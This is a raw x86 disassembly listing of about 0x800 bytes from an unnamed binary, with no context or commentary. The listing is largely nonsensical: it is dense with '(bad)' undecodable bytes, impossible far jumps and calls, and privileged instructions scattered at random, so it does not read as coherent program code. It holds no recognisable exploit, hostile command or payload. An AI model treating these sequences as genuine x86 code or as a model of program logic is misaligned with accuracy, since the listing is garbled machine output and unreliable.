  431469:	(bad)  
  43146a:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  431471:	pushf  
  431472:	rol    DWORD PTR [ebp-0x72019a],0xff
  431479:	add    bh,bh
  43147b:	add    BYTE PTR [edi],cl
  43147d:	test   DWORD PTR [eax],eax
  43147f:	(bad)  
  431480:	dec    WORD PTR [ebp-0xff0031]
  431487:	mov    DWORD PTR [ecx-0xb748],ecx
  43148d:	lea    eax,[ebx+0x7cffc1b0]
  431493:	push   eax
  431494:	add    BYTE PTR [ebp+0x66],al
  431497:	xor    ecx,DWORD PTR [ebp-0xaf00fd]
  43149d:	test   eax,esi
  43149f:	(bad)  
  4314a0:	fdiv   st(7),st
  4314a2:	add    bh,bh
  4314a4:	data16 clc 
  4314a6:	lea    edx,[ebp-0x1]
  4314a9:	(bad)  
  4314aa:	dec    DWORD PTR [eax-0x72b50077]
  4314b0:	dec    DWORD PTR [eax-0x1237a73]
  4314b6:	(bad)  
  4314b7:	(bad)  
  4314b8:	(bad)  
  4314b9:	cdq    
  4314ba:	inc    DWORD PTR [eax]
  4314bc:	ja     0x431447
  4314be:	lea    edi,[eax-0x72000050]
  4314c4:	push   ecx
  4314c5:	mov    al,0x4d
  4314c7:	jmp    DWORD PTR [esi+0x50]
  4314ca:	mov    ch,0x45
  4314cc:	push   DWORD PTR [ebx]
  4314ce:	inc    DWORD PTR [ebx]
  4314d0:	push   ebx
  4314d1:	push   eax
  4314d2:	push   ecx
  4314d3:	test   DWORD PTR [ebx],esi
  4314d5:	(bad)  
  4314d6:	mov    ebx,0xff72ff
  4314db:	clc    
  4314dc:	retf   
  4314dd:	push   ebp
  4314de:	(bad)  
  4314df:	jmp    0x1421624
  4314e4:	push   ecx
  4314e5:	jae    0x4314a7
  4314e7:	add    BYTE PTR [ebp-0x38bb73],cl
  4314ed:	mov    DWORD PTR [ecx+0x40],edx
  4314f0:	(bad)  
  4314f1:	(bad)  
  4314f2:	cld    
  4314f3:	mov    eax,DWORD PTR [ebp-0x7a019a]
  4314f9:	inc    DWORD PTR [ebp-0x3f0101]
  4314ff:	inc    bp
  431501:	test   DWORD PTR [ebx+0xff98ff],ecx
  431507:	inc    edi
  431508:	(bad)  
  431509:	dec    si
  43150b:	test   edi,edi
  43150d:	(bad)  
  43150e:	cmp    eax,0xc74f7bff
  431513:	mov    edx,DWORD PTR [edx-0x7d]
  431516:	(bad)  
  431517:	mov    ebx,0x563a8931
  43151c:	(bad)  
  43151d:	call   FWORD PTR [esi-0x47]
  431520:	inc    DWORD PTR ds:0x893c00e2
  431526:	mov    DWORD PTR [eax-0x4c],ebx
  431529:	(bad)  
  43152a:	jmp    DWORD PTR [esi-0x1]
  43152d:	test   edi,edi
  43152f:	dec    DWORD PTR [eax]
  431531:	(bad)  
  431532:	inc    eax
  431534:	or     BYTE PTR [ecx+0x8b5745],bh
  43153a:	sbb    al,0x89
  43153c:	rcr    BYTE PTR [edx-0x7c],0xff
  431540:	add    ecx,DWORD PTR [ebx+0x6165b900]
  431546:	add    BYTE PTR [eax],al
  431548:	inc    ebp
  431549:	mov    DWORD PTR ds:0xc7ff9c5c,esi
  43154f:	data16 fdiv DWORD PTR [ebp-0x7007b]
  431556:	inc    ebp
  431557:	dec    ebp
  431558:	cmp    DWORD PTR [ecx-0x38b764],ecx
  43155e:	lock lea eax,[ebp+0x458df81c]
  431565:	(bad)  
  431566:	xor    eax,0x8b8b9fff
  43156b:	hlt    
  43156c:	cld    
  43156d:	mov    DWORD PTR [eax+0xff014c],eax
  431573:	mov    esi,0x78b0845
  431578:	cld    
  431579:	into   
  43157a:	dec    ebp
  43157b:	call   0x5100:0x38c328b
  431582:	mov    ecx,DWORD PTR [ebp-0x6f0075]
  431588:	add    BYTE PTR [ebx],dh
  43158a:	mov    DWORD PTR [eax-0x1c],eax
  43158d:	lea    edi,[ebp-0x2]
  431590:	test   edi,edi
  431592:	jne    0x4315e4
  431594:	push   DWORD PTR [ebp+0x18]
  431597:	mov    DWORD PTR [ebp+0x44],edx
  43159a:	call   0xffcd109e
  43159f:	mov    al,0x45
  4315a1:	dec    DWORD PTR [ebx+0x3fc8b8b]
  4315a7:	cmp    BYTE PTR [ecx+eax*1],0xf
  4315ab:	add    BYTE PTR [ebp-0x7b],al
  4315ae:	test   edi,edi
  4315b0:	je     0x4315b1
  4315b2:	dec    DWORD PTR [edi-0x4]
  4315b5:	dec    edi
  4315b6:	or     al,BYTE PTR [ebp-0x740001]
  4315bc:	cld    
  4315bd:	dec    edi
  4315be:	or     BYTE PTR [edi+0x1],0x85
  4315c2:	add    bh,bh
  4315c4:	add    bh,bh
  4315c6:	(bad)  
  4315c7:	icebp  
  4315c8:	ret    
  4315c9:	dec    edi
  4315ca:	inc    ebp
  4315cb:	xchg   ebp,eax
  4315cc:	jne    0x4315cc
  4315ce:	mov    edi,edi
  4315d0:	cld    
  4315d1:	xor    BYTE PTR [ecx+0x500155],cl
  4315d7:	push   ebp
  4315d8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4315de:	add    BYTE PTR [ebp+0x35e90f50],al
  4315e4:	add    al,BYTE PTR [eax]
  4315e6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315ec:	add    ah,ch
  4315ee:	or     BYTE PTR [ebp+0x4501f845],dh
  4315f4:	jmp    0xdf18ee
  4315f9:	(bad)  
  4315fa:	nop    ecx
  4315fd:	test   DWORD PTR [ebp+0x4502f8],eax
  431603:	cmp    ecx,DWORD PTR [ebp-0x64]
  431606:	mov    eax,edi
  431608:	mov    ebx,DWORD PTR [eax+edx*2]
  43160b:	add    eax,0x45fef885
  431610:	dec    DWORD PTR [ebx+0x339445]
  431616:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43161c:	dec    DWORD PTR [ebx-0x460f0375]
  431622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431623:	add    esi,edi
  431625:	add    bh,bh
  431627:	rdpmc  
  431629:	add    BYTE PTR [ebx],0x1
  43162c:	mov    DWORD PTR [eax],eax
  43162e:	add    al,0x45
  431630:	dec    DWORD PTR [ecx-0x360b3373]
  431636:	dec    DWORD PTR [esi]
  431638:	push   eax
  431639:	jne    0x431680
  43163b:	mov    esi,DWORD PTR [ebx]
  43163d:	cld    
  43163e:	add    ebp,ebp
  431640:	push   eax
  431641:	inc    DWORD PTR [ebp-0x75]
  431644:	add    eax,0x800e4
  431649:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43164f:	mov    DWORD PTR [ecx],eax
  431651:	sbb    al,0x0
  431653:	leave  
  431654:	test   DWORD PTR [edi-0x2],eax
  431657:	jne    0x431658
  431659:	call   0xff44015e
  43165e:	xor    BYTE PTR [ebp+0x4d],al
  431661:	mov    edi,edi
  431663:	enter  0x8,0x4d
  431667:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43166d:	mov    eax,DWORD PTR [eax]
  43166f:	cld    
  431670:	add    DWORD PTR [ecx],ebx
  431672:	inc    ebp
  431673:	dec    ebp
  431674:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43167a:	inc    eax
  43167b:	dec    DWORD PTR [ecx-0x270375]
  431681:	add    BYTE PTR [ebx-0x39d72701],cl
  431687:	xchg   ecx,eax
  431688:	ret    
  431689:	add    BYTE PTR [ebp-0x830075],al
  43168f:	add    BYTE PTR [ebp-0x75],al
  431692:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431698:	lea    edi,[edi-0xc]
  43169b:	add    bh,bh
  43169d:	mov    edx,DWORD PTR [eax-0x7b]
  4316a0:	inc    ebp
  4316a1:	rdpmc  
  4316a3:	jne    0x4316a8
  4316a5:	add    BYTE PTR [eax-0x75],dl
  4316a8:	inc    ebp
  4316a9:	clc    
  4316aa:	add    eax,0x400009
  4316af:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4316b5:	mov    eax,DWORD PTR [ecx]
  4316b7:	in     al,dx
  4316b8:	add    dh,al
  4316ba:	test   ebx,eax
  4316bc:	inc    BYTE PTR [ebp-0xff0001]
  4316c2:	add    BYTE PTR [ebp-0x43],al
  4316c5:	cmp    esi,0xfffffff8
  4316c8:	(bad)  
  4316c9:	push   DWORD PTR [eax]
  4316cb:	add    BYTE PTR [ebp-0x3a],dl
  4316ce:	test   ebx,eax
  4316d0:	je     0x431657
  4316d2:	mov    edi,edi
  4316d4:	sbb    al,0xff
  4316d6:	test   DWORD PTR gs:[eax],eax
  4316d9:	(bad)  
  4316da:	js     0x4316db
  4316dc:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4316e2:	sub    eax,ebx
  4316e4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316ea:	add    eax,DWORD PTR [eax]
  4316ec:	dec    ebp
  4316ed:	push   eax
  4316ee:	mov    al,BYTE PTR [ebp+0x1]
  4316f1:	mov    eax,DWORD PTR [ebp-0x68]
  4316f4:	mov    eax,DWORD PTR [eax]
  4316f6:	sbb    bh,al
  4316f8:	or     ah,dh
  4316fa:	dec    ebp
  4316fb:	inc    DWORD PTR [eax+0x4]
  4316fe:	push   ecx
  4316ff:	add    BYTE PTR [edx-0x1],dh
  431702:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431708:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  431712:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431718:	push   ecx
  431719:	cmp    BYTE PTR [ebx],al
  43171b:	inc    ebp
  43171c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  431722:	(bad)  
  431723:	(bad)  
  431724:	in     al,0xff
  431726:	add    BYTE PTR [ebp+0x0],al
  431729:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43172f:	add    al,bh
  431731:	(bad)  
  431732:	jmp    0x8d85:0x74b0558d
  431739:	dec    DWORD PTR [eax]
  43173b:	call   DWORD PTR [ebp-0x7b]
  43173e:	mov    edi,esi
  431740:	lock call DWORD PTR [ebp-0x75]
  431744:	mov    esi,esp
  431746:	mov    ah,0xc6
  431748:	mov    bh,0xc3
  43174a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431750:	add    DWORD PTR [eax],0x450050ff
  431756:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43175c:	inc    edi
  43175e:	push   esp
  431760:	jmp    0xcd00:0x660481ff
  431767:	mov    DWORD PTR [ebx],esi
  431769:	clc    
  43176a:	cmp    edi,0xff9cff3a
  431770:	jne    0x43177a
  431772:	mov    eax,eax
  431774:	add    esi,DWORD PTR [eax]
  431776:	int3   
  431777:	inc    ebp
  431778:	cmp    al,0x83
  43177a:	add    BYTE PTR [eax],bl
  43177c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431782:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431788:	mov    edi,eax
  43178a:	cmp    BYTE PTR [ebp+0x45],cl
  43178d:	jmp    0x43171a
  43178f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431792:	inc    ebp
  431793:	or     al,0x2
  431795:	dec    DWORD PTR [ebp+0x18]
  431798:	jne    0x4317ef
  43179a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4317a0:	mov    edi,DWORD PTR [ebx]
  4317a2:	in     al,0x50
  4317a4:	xchg   ecx,eax
  4317a5:	jmp    0x34366aa
  4317aa:	adc    al,0x8b
  4317ac:	inc    ebp
  4317ad:	mov    al,ds:0x8b04008b
  4317b2:	push   ebp
  4317b3:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4317b9:	push   ebp
  4317ba:	test   DWORD PTR [ebx-0x2800d701],ecx
  4317c0:	inc    ebp
  4317c1:	dec    ebp
  4317c2:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4317c8:	mov    DWORD PTR [eax],0xe9ff00f4
  4317ce:	add    al,0x0
  4317d0:	add    BYTE PTR [eax],al
  4317d2:	mov    eax,edx
  4317d4:	push   eax
  4317d5:	rol    DWORD PTR [ebp-0xf0177],1
  4317db:	bound  eax,QWORD PTR [ebp+0x50]
  4317de:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317e4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317ea:	mov    al,0xf
  4317ec:	test   DWORD PTR [edx],edx
  4317ee:	call   DWORD PTR [ebp-0x7a0001]
  4317f4:	(bad)  
  4317f5:	loop   0x4317f6
  4317f7:	jnp    0xc6990bfd
  4317fd:	mov    eax,ebx
  4317ff:	cmp    al,0x8b
  431801:	(bad)  
  431802:	cld    
  431803:	shr    esi,0xc
  431806:	add    dl,al
  431808:	push   eax
  431809:	lea    eax,[ebp-0x1]
  43180c:	mov    edx,esi
  43180e:	cwde   
  43180f:	cli    
  431810:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431816:	or     BYTE PTR [eax],cl
  431818:	inc    ebp
  431819:	dec    ebp
  43181a:	inc    DWORD PTR [ebx+0x74803914]
  431820:	add    DWORD PTR [ebx+0x451800],ecx
  431826:	call   DWORD PTR [eax+edx*1]
  431829:	add    ecx,DWORD PTR [ebp-0x34]
  43182c:	push   edi
  43182d:	adc    al,0x8
  43182f:	mov    edx,DWORD PTR [ebp-0x14]
  431832:	mov    ecx,DWORD PTR [ebp+0x18]
  431835:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431839:	inc    DWORD PTR [eax+esi*8]
  43183c:	inc    ebp
  43183d:	stos   BYTE PTR es:[edi],al
  43183e:	mov    edx,DWORD PTR [ebp-0x4]
  431841:	add    DWORD PTR [ebp-0x1c],eax
  431844:	mov    edx,DWORD PTR [ebp-0x70]
  431847:	cmp    eax,DWORD PTR [eax]
  431849:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43184a:	mov    eax,DWORD PTR [eax]
  43184c:	cld    
  43184d:	jae    0x4317cf
  43184f:	add    eax,DWORD PTR [ecx]
  431851:	clc    
  431852:	add    BYTE PTR [eax+0x30],dl
  431855:	mov    DWORD PTR [ecx],esi
  431857:	clc    
  431858:	pop    ds
  431859:	inc    ebp
  43185a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431860:	(bad)  
  431861:	push   DWORD PTR [edi]
  431863:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431869:	(bad)  
  43186a:	jae    0x43186b
  43186c:	mov    eax,DWORD PTR [ebp-0x740175]
  431872:	sub    eax,DWORD PTR [eax]
  431874:	add    eax,DWORD PTR [eax]
  431876:	mov    DWORD PTR [ecx+0x5f],eax
  431879:	mov    DWORD PTR [ebx-0x4],ebx
  43187c:	ret    0xff
  43187f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431885:	ret    
  431886:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43188c:	add    BYTE PTR [ebp-0x7d],al
  43188f:	mov    DWORD PTR [eax],eax
  431891:	add    al,0x84
  431893:	inc    DWORD PTR [ecx]
  431895:	lea    eax,[eax]
  431897:	hlt    
  431898:	sar    bh,cl
  43189a:	test   BYTE PTR [eax+0x1],dl
  43189d:	inc    ebp
  43189e:	add    BYTE PTR [ebx],dh
  4318a0:	test   BYTE PTR [ebx],0x84
  4318a3:	push   eax
  4318a4:	add    BYTE PTR [ebp+0x0],al
  4318a7:	add    eax,0x86
  4318ac:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4318b2:	add    BYTE PTR [ecx],al
  4318b4:	add    BYTE PTR [eax],al
  4318b6:	mov    esi,0x550030
  4318bb:	mov    ecx,DWORD PTR [edi]
  4318bd:	cld    
  4318be:	fidiv  DWORD PTR [ebp+0x0]
  4318c1:	mov    edi,DWORD PTR [ecx]
  4318c3:	xor    BYTE PTR [eax+eax*1],0x84
  4318c7:	add    eax,DWORD PTR [eax]
  4318c9:	sbb    BYTE PTR [eax],al
  4318cb:	jne    0x43187e
  4318cd:	mov    eax,DWORD PTR [ecx]
  4318cf:	sbb    BYTE PTR [eax],al
  4318d1:	mov    DWORD PTR [ebp-0x1],esp
  4318d4:	add    BYTE PTR [eax+0x30e45ca],bh
  4318da:	ret    0xb7fc
  4318dd:	dec    ebp
  4318de:	or     al,0x89
  4318e0:	dec    ebp
  4318e1:	cld    
  4318e2:	cmovne ecx,DWORD PTR [eax-0x75]
  4318e6:	add    edi,esp
  4318e8:	seto   BYTE PTR [esi-0x72ffffff]
  4318ef:	inc    ebp
  4318f0:	adc    al,0x8b
  4318f2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318f9:	cmp    DWORD PTR [edi+0x72],edx
  4318fc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431902:	gs cmp al,0x0
  431905:	je     0x4318dd
  431907:	push   eax
  431908:	sar    BYTE PTR [eax],1
  43190a:	mov    bh,0x3e
  43190c:	push   cs
  43190d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431913:	add    DWORD PTR [ecx+0x12],ebp
  431916:	dec    edx
  431917:	(bad)  
  431918:	mov    eax,edx
  43191a:	in     al,dx
  43191b:	adc    DWORD PTR [ecx],esi
  43191d:	pop    esi
  43191e:	inc    ecx
  43191f:	leave  
  431920:	or     DWORD PTR [eax],ebx
  431922:	gs push ebp
  431924:	add    ah,ch
  431926:	into   
  431927:	in     al,dx
  431928:	enter  0xb756,0xf0
  43192c:	push   cs
  43192d:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431937:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43193d:	jnp    0x74439e45
  431943:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431949:	add    BYTE PTR [edi],cl
  43194b:	mov    edi,DWORD PTR [ecx-0x78]
  43194e:	ltr    WORD PTR [ecx-0x7b]
  431952:	dec    DWORD PTR [edi]
  431954:	clc    
  431955:	out    0x45,eax
  431957:	add    BYTE PTR [eax],cl
  431959:	cmp    ebx,0xffffff8c
  43195c:	jge    0x43195e
  43195e:	jb     0x431970
  431960:	je     0x5219e0
  431966:	pop    edx
  431967:	push   esi
  431968:	mov    ecx,DWORD PTR [edi]
  43196a:	in     al,dx
  43196b:	rol    DWORD PTR [ebp+0x0],1
  43196e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431975:	cmp    DWORD PTR [ecx],0xfffffff0
  431978:	hlt    
  431979:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43197f:	(bad)  
  431981:	push   eax
  431982:	jns    0xb842fe00
  431988:	lock push cs
  43198a:	ror    edx,0x3
  43198d:	test   BYTE PTR [ecx+0x5500e800],cl
  431993:	dec    eax
  431994:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431998:	(bad)  
  431999:	mov    esi,0x7f33ff5f
  43199e:	inc    eax
  43199f:	test   DWORD PTR [edx],eax
  4319a1:	je     0x431963
  4319a3:	mov    ecx,ecx
  4319a5:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4319a9:	and    eax,DWORD PTR [eax+0xf0103]
  4319af:	jp     0x43199d
  4319b1:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4319b5:	add    edx,DWORD PTR [edi+0x74]
  4319b8:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4319be:	add    BYTE PTR [ebp-0x74c48bbb],al
  4319c4:	je     0x431949
  4319c6:	cmp    eax,edi
  4319c8:	js     0x4319ed
  4319ca:	add    eax,0xeb0fc003
  4319cf:	jns    0x43195c
  4319d1:	vmread DWORD PTR [ecx+0x45],ebx
  4319d5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4319db:	adc    al,0x8b
  4319dd:	jge    0x4319f3
  4319df:	mov    edi,DWORD PTR [eax-0x4]
  4319e2:	add    edi,DWORD PTR [edi]
  4319e4:	or     bh,bh
  4319e6:	push   ebp
  4319e7:	push   es
  4319e8:	mov    DWORD PTR [ebp-0x4],ebx
  4319eb:	add    edi,esi
  4319ed:	pop    es
  4319ee:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319f4:	mov    DWORD PTR [esp+esi*8],ecx
  4319f7:	inc    ebp
  4319f8:	pop    ebp
  4319f9:	xor    DWORD PTR [esi-0x4],0x3b
  4319fd:	add    edx,DWORD PTR [ecx+edi*1]
  431a00:	push   es
  431a01:	clc    
  431a02:	mov    bh,0xdb
  431a04:	jp     0x4319bd
  431a06:	add    cl,BYTE PTR [esi]
  431a08:	div    DWORD PTR [edi+0x4d8b0c1c]
  431a0e:	test   edi,edi
  431a10:	je     0x431a06
  431a12:	mov    eax,ecx
  431a14:	or     BYTE PTR [ebx],al
  431a16:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431a1c:	jbe    0x431a90
  431a1e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431a24:	add    ecx,DWORD PTR [esi]
  431a26:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431a2c:	add    eax,DWORD PTR [ebx-0x287af783]
  431a32:	je     0x431a81
  431a34:	mov    DWORD PTR [ecx],edi
  431a36:	mov    esi,eax
  431a38:	hlt    
  431a39:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431a40:	jb     0x431a02
  431a42:	jmp    0x431a2f
  431a44:	xor    esi,DWORD PTR [ebx]
  431a46:	pop    edi
  431a47:	pop    esi
  431a48:	pop    ebx
  431a49:	ret    
  431a4a:	ret    0x8b
  431a4d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a53:	xor    DWORD PTR ds:0x89339c0c,0x56
  431a5a:	cld    
  431a5b:	cmp    DWORD PTR [ebp+0xf],eax
  431a5e:	xor    al,0x85
  431a60:	pushf  
  431a61:	add    BYTE PTR [ebx+0x4d0cfc8b],cl
  431a67:	ret    
  431a68:	mov    edi,DWORD PTR [esi-0x4]
  431a6b:	pop    eax
  431a6c:	dec    ebp
  431a6d:	jne    0x4319fa
  431a6f:	xor    edi,esp
  431a71:	inc    eax
  431a72:	dec    ebp
  431a73:	jbe    0x431ac8
  431a75:	inc    eax
  431a76:	pop    ebp
  431a77:	add    edx,DWORD PTR [esi+0x8]
  431a7a:	push   ebx
  431a7b:	dec    eax
  431a7c:	push   ecx
  431a7d:	mov    eax,edi
  431a7f:	and    al,0xf0
  431a81:	jo     0x431a6e
  431a83:	mov    eax,DWORD PTR [ebx]
  431a85:	sbb    BYTE PTR [ebp+0x4d],cl
  431a88:	mov    eax,DWORD PTR [ebx]
  431a8a:	nop
  431a8b:	or     BYTE PTR [eax],al
  431a8d:	jne    0x431ae6
  431a8f:	cmp    ebx,DWORD PTR [edx+0x33893277]
  431a95:	cld    
  431a96:	xor    edi,edi
  431a98:	add    edi,DWORD PTR [ebp+0x3]
  431a9b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431aa1:	js     0x431a27
  431aa3:	jae    0x431aa7
  431aa5:	(bad)  
  431aa7:	xor    al,0x5d
  431aa9:	jmp    0x431a36
  431aab:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431ab2:	fdecstp 
  431ab4:	test   BYTE PTR [edi],ah
  431ab6:	add    bh,BYTE PTR [ebp+0x0]
  431ab9:	add    ebx,DWORD PTR [ebp-0x77]
  431abc:	mov    edi,eax
  431abe:	cmp    al,0x0
  431ac1:	adc    dh,BYTE PTR [ebx]
  431ac3:	jge    0x431ac8
  431ac5:	mov    edi,DWORD PTR [ebx]
  431ac7:	jl     0x431ad8
  431ac9:	clc    
  431aca:	dec    edi
  431acb:	jge    0x431acd
  431acd:	mov    eax,DWORD PTR [ebx]
  431acf:	jb     0x431ad9
  431ad1:	mov    ecx,DWORD PTR [ebp-0x8]
  431ad4:	mov    edi,edi
  431ad6:	xor    edx,DWORD PTR [eax]
  431ad8:	add    edi,DWORD PTR [ebx]
  431ada:	mov    DWORD PTR [ebp-0x10],edi
  431add:	inc    edi
  431ade:	pop    ebp
  431adf:	jge    0x431b1c
  431ae1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ae5:	mov    edx,0xc05d87f0
  431aea:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431aee:	fimul  WORD PTR [eax]
  431af0:	fist   WORD PTR [ebp+0x1c]
  431af3:	in     al,dx
  431af4:	jne    0x431ae2
  431af6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431afc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431b00:	fdivp  st(0),st
  431b02:	fild   WORD PTR [ebp+0x4510f85c]
  431b08:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431b0e:	inc    ebp
  431b0f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431b15:	mov    ebp,DWORD PTR [ebx-0x4]
  431b18:	adc    al,0x8b
  431b1a:	rcl    DWORD PTR [eax],0x48
  431b1d:	mov    esi,0x7080803
  431b22:	fiadd  WORD PTR [ebp+0x4d]
  431b25:	(bad)  
  431b26:	mov    edx,DWORD PTR [edx-0x4]
  431b29:	mov    edx,DWORD PTR [ebp-0x4]
  431b2c:	xor    ebx,DWORD PTR [ebx+0x330103]
  431b32:	mov    DWORD PTR [edi+0x872dc],edi
  431b38:	xlat   BYTE PTR ds:[ebx]
  431b39:	into   
  431b3a:	ffreep st(6)
  431b3c:	retf   0x6c7
  431b3f:	iret   
  431b40:	dec    ebp
  431b41:	inc    ebp
  431b42:	mov    DWORD PTR [ebx],edi
  431b44:	fmul   QWORD PTR [edi]
  431b46:	dec    ebp
  431b47:	jnp    0x431b7c
  431b49:	add    BYTE PTR [ebx],al
  431b4b:	mov    ecx,DWORD PTR [esp+edi*8]
  431b4e:	inc    ebp
  431b4f:	dec    ebp
  431b50:	lea    esi,[ebx]
  431b52:	add    DWORD PTR [ebx],eax
  431b54:	jb     0x431b91
  431b56:	add    BYTE PTR [edi],cl
  431b58:	inc    ebp
  431b59:	imul   eax,edi,0x858bd800
  431b5f:	cld    
  431b60:	clc    
  431b61:	mov    DWORD PTR [ebp+0x0],eax
  431b64:	inc    DWORD PTR [eax]
  431b66:	or     al,0xde
  431b68:	sbb    bh,0x1
  431b6b:	retf   
  431b6c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b73:	dec    ebp
  431b74:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b7a:	enter  0x12de,0xdf
  431b7e:	inc    ebp
  431b7f:	pop    ebp
  431b80:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b86:	add    DWORD PTR [edx],edx
  431b88:	add    BYTE PTR [ebp+0x50],dl
  431b8b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b91:	xor    ecx,DWORD PTR [ebx+eax*1+0xac73966]
  431b98:	loopne 0x431bb1
  431b9a:	cdq    
  431b9b:	push   ebp
  431b9c:	clc    
  431b9d:	mov    eax,DWORD PTR [ebp-0x4]
  431ba0:	xor    edx,edx
  431ba2:	add    esi,DWORD PTR [ebx]
  431ba4:	cmp    eax,DWORD PTR [ebx]
  431ba6:	hlt    
  431ba7:	cmp    DWORD PTR [ebx],esp
  431ba9:	or     al,BYTE PTR [ebp+0xf]
  431bac:	mov    eax,DWORD PTR [edx]
  431bae:	loopne 0x431bb0
  431bb0:	(bad)  
  431bb1:	mov    ecx,esi
  431bb3:	cld    
  431bb4:	pushf  
  431bb5:	pop    ebp
  431bb6:	call   0x10c0:0x8bf0328b
  431bbd:	add    eax,DWORD PTR [eax+0x10018b]
  431bc3:	dec    ebp
  431bc4:	iret   
  431bc5:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431bcb:	dec    ebp
  431bcc:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431bd2:	(bad)  
  431bd3:	iret   
  431bd4:	inc    ebp
  431bd5:	(bad)  
  431bd6:	jne    0x431c25
  431bd8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431bde:	(bad)  
  431bdf:	cmp    ebx,eax
  431be1:	je     0x431b69
  431be3:	add    edi,edi
  431be5:	or     bh,bh
  431be7:	dec    ebp
  431be8:	inc    ebp
  431be9:	mov    esi,DWORD PTR [ebx]
  431beb:	cld    
  431bec:	add    ecx,esi
  431bee:	cmp    ecx,DWORD PTR [eax-0xc]
  431bf1:	mov    edx,DWORD PTR [edi]
  431bf3:	or     BYTE PTR [ebp-0x7c],al
  431bf6:	mov    ebx,DWORD PTR [edx-0x7639cd18]
  431bfc:	test   BYTE PTR [edx+ebx*4],cl
  431bff:	inc    ebp
  431c00:	xor    bh,BYTE PTR [eax]
  431c02:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431c09:	jne    0x431bd2
  431c0b:	mov    ebp,esp
  431c0d:	fcomp  DWORD PTR [ebx]
  431c0f:	add    BYTE PTR [ecx],al
  431c11:	inc    DWORD PTR [ebp-0x75]
  431c14:	(bad)  
  431c15:	cld    
  431c16:	add    al,0xce
  431c18:	mov    ecx,edi
  431c1a:	cld    
  431c1b:	inc    ebp
  431c1c:	fidivr WORD PTR [ebx]
  431c1e:	fbstp  TBYTE PTR [ebp-0x3e]
  431c21:	mov    eax,DWORD PTR [eax]
  431c23:	adc    BYTE PTR [ebx-0x3974038b],cl
  431c29:	fadd   st,st(7)
  431c2b:	add    BYTE PTR [ebp-0x1],al
  431c2e:	mov    ecx,DWORD PTR [esp+edi*8]
  431c31:	inc    ebp
  431c32:	mov    bh,0xc7
  431c35:	loopne 0x431c7c
  431c37:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431c3d:	sbb    al,0x33
  431c3f:	pushf  
  431c40:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c46:	mov    eax,edi
  431c48:	cwde   
  431c49:	inc    ebp
  431c4a:	inc    ebp
  431c4b:	jne    0x431bd8
  431c4d:	mov    esp,esp
  431c4f:	clc    
  431c50:	add    al,0x4d
  431c52:	mov    DWORD PTR [ebx],esi
  431c54:	or     al,0x33
  431c56:	inc    ebp
  431c57:	lea    ecx,[ebx-0x398d13fd]
